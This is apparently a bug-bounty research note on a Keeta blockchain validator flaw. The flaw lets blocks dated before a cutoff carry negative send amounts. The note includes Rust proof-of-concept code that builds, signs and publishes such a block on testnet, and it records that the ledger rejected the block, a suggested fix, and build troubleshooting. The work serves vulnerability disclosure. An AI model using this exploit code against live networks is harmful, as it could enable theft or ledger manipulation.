# Keeta Funded Wallet Live Publish — Validator Bypass ≠ Ledger Profit (2026-08-12)

## Wallet
- Address: `keeta_afen47xmyv5h7be7er37yqkowvzakxieqzcpuhofznpxm2dwippelqsvlkefk`
- Seed hex: `<redacted>` (redacted in logs, stored `/tmp/wallet_KTA.json` 269B, source `1.1K` `/tmp/wallet_KTA/src/main.rs`)
- Network universal (main/test/dev) — `GenericAccount::Ed25519` via `Account::try_from(Keyable::Seed((Box::new(seed).into(),0)))`
- Derived token `keeta_aocratkgvoh4njdmzhmmogse75v77enucomew2ac2ht56wv5klxbawvhshilq` (TOKEN id 0, not KTA)
- KTA base token (test) `keeta_anyiff4v34alvumupagmdyosydeq24lc4def5mrpmmyhx3j6vj2uucckeqn52` (supply `1000011105199999999999991`, decimals 9)

## Faucet Funding (faucet.test.keeta.com)
- Request ID `7a847ddc-9975-4a26-967c-49baa5bf4d54`, amount `10.000000000 KTA` = `10000000000` base units
- Faucet frontend `GET / → 200 len 215620` text `Keeta Testnet Faucet`; backend `POST /api/faucet {"address":...} → 503`, `POST /api/claim {"publicKey":...} → 500` — down, but user's browser CAPTCHA succeeded
- Explorer `GET /api/v1/account/keeta_...?networkAlias=test → 200 {"balance":"10000000000","headBlock":null}` — poll 6× stays null, history 404; credit visible via REP pending, not anchored

## Establishing Head (required for successor)
```rust
let generic: Arc<GenericAccount> = Arc::new(GenericAccount::Ed25519(acc));
let client = UserClient::from_network(Network::Test, Some(Arc::clone(&generic)))?;
let kta: GenericAccount = "keeta_anyiff4v34alvumupagmdyosydeq24lc4def5mrpmmyhx3j6vj2uucckeqn52".parse().unwrap();
let kta_arc = Arc::new(kta);
client.client().send(&generic, &generic, &kta_arc, Amount::from(1u64)).await // → Ok hash true
```
- Result head `9408C90ED35B7D4347B1B976D9E487D27B0616D383D76A92B730A86EEEC16A36`, balance `9999559600` (fee ~4400). Proves fresh funded path.

## Minus Successor 2024 (Validator Ok, Ledger Internal)
```rust
let date_before = BlockTime::from_unix_millis(1717200000000).unwrap(); // 2024-06-01 < 1763683200000
let amount_neg = Amount::from(-1000000i64);
let unsigned = BlockBuilder::default()
  .with_network(Network::Test.id()).with_account(generic.clone())
  .with_date(date_before).with_previous(prev.hash())
  .with_operation(Send { to: generic.clone(), amount: amount_neg, token: kta_arc.clone(), external: None })
  .build()?; // → Ok hash C76CAD0E2090A9868B4585DAD9F3A75A057577662A28E72CC7953178B7DD0BA8 len 250
let sealed = unsigned.sign()?; // hex a181b53081b2020454455354180f... (247-250B)
client.publish(sealed, Default::default()).await
// → ERR Node { Code "" message "Internal error occurred (error ID: c0231a48-cc2f-4885-be7e-3247d7bd85ad)" }
```
- Post balance `9999559600` unchanged (explorer + `client.balance`).
- Compare: Main dummy opening `EB3319A7... → 23872561... Internal error`, Test opening `4AC7E2AD... → 348d70a9...`, Test successor `C76CAD0E... → c0231a48...` — all `Internal error`, never `AmountBelowZero`.
- Validator `Main Before 2024 Ok 411222E00C1E65E2...678DB9B7C` vs `After AmountBelowZero` (local `poc_negative_check`) stays true; ledger JS re-validates.

## Bounty Framing
- Claim: **VALIDATOR BYPASS High** — `validation.rs:207-214` `if date_ms < 1763683200000 { Ok }` allows `amount=-1e6` on **all networks** `0x5382` Main etc. with `hash 411222E0...` / `C76CAD0E...` + unsigned hex. Do NOT claim `+1M` ledger profit.
- Mitigation: ledger-side `require!(amount > 0)` independent of `validate_numeric_value`; or `balance >= amount && amount > 0`.

## Disk Budget (20G VPS)
- `minus_publish` build `3m25s` → `No space left (173M free 100%)` on `cryptoxide` temp dir
- Fix: `rm -rf /tmp/check_funded/target /tmp/minus_publish/target` → `2.7G free 87%` → rebuild OK
- Keep `2.5G+` before `cargo run` with `keetanetwork-client` (transitive `aws-lc-sys` 1.6G `libaws_lc_*_crypto.a` via `ar cqD`)

## Pitfalls (keetanetwork-account)
- `SecretBox<[u8;32]>: From<[u8;32]>` not impl — must `Box::new(seed).into()`; `Keyable::Seed((SecretBox, u32))` single arg, `KeyAndType(Keyable, KeyPairType)` two args
- `GenericAccount` no `Clone` — wrap `Arc::new(kta)` not `kta.clone()`
- `Block::hash()` trait `Hashable` — need `use keetanetwork_crypto::hash::Hashable`
- Faucet `headBlock null` until first publish — use `UserClient.send 1` to anchor; `balance` available immediately via REP state not block
